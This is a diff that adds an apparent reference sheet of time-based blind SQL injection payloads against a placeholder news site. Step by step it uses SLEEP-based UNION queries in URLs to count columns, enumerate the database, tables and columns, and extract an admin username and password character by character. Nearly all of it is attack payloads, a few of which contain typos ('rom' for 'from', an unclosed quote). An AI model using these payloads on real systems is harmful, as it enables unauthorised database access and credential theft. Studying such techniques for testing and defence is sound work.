@@ -1,0 +1,46 @@
+/* Insane - Try in URL (Get requests) **
+** Blind SQL Injection **
+**(where no error messages or any other indication
+** are being displayed and you can only count the delay
+** in query's reply*/
+
+/*STEP 1 - Always use SLEEP(x)*/
+--Use a SLEEP(x) function that delays query execution for 'x' seconds, if successul to find columns in current table :
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5);-- [If executed without a delay in response time, then query was unsuccessfuly executed]
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2;-- [Got a delay! So, current table has 2 columns!]
+
+/*STEP 2 - Start enumerating*/
+--Search for DB:
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 WHERE database() like 'a%';--
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 WHERE database() like 'sa%';-- [found 's' as first letter; searching for the rest]
+[test all characters one by one, until we get a 5sec delay. In this case, db is 'sitedb']
+
+--Search for tables in DB:
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.tables WHERE table_schema = 'sitedb' and table_name like 'a%';--
+[test all characters one by one, until we get a 5sec delay. In this case, found 'users' table]
+
+--Enumerate columns in table 'users':
+--Find first column (not necessarily in the right order!)
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%';--
+[test all characters one by one, until we get a 5sec delay. In this case, found 'id' column]
+
+--Find second column (not necessarily in the right order!)
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%' and COLUMN_NAME != 'id';--
+[test all characters one by one, until we get a 5sec delay. In this case, found 'username' column]
+
+--Find third column (not necessarily in the right order!)
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from information_schema.columns WHERE table_schema = 'sitedb' and table_name = 'users' and column_name like 'a%' and COLUMN_NAME != 'id' and COLUMN_NAME != 'username';--
+[test all characters one by one, until we get a 5sec delay. In this case, found 'password' column]
+
+--Find other columns (if exist), using the above mentioned methodology
+
+--Search for 'admin', 'administrator', 'sa', 'root', 'superuser', etc. in table 'users':
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 from users where username like 'a%;--
+[test all characters one by one, until we get a 5sec delay. In this case, found 'admin' username]
+
+--Search for admin's password in table 'users':
+http://my.vulnerablesite.com/news?author=nouser' UNION SELECT SLEEP(5),2 rom users where username = 'admin' and password like 'a%';--
+[test all characters one by one, until we get a 5sec delay. In this case, found admin's password to be '!Ro217ck']
+
+
+****ATTN: When using credentials stored in DB always hash them! Never leave them as plaintext! ****
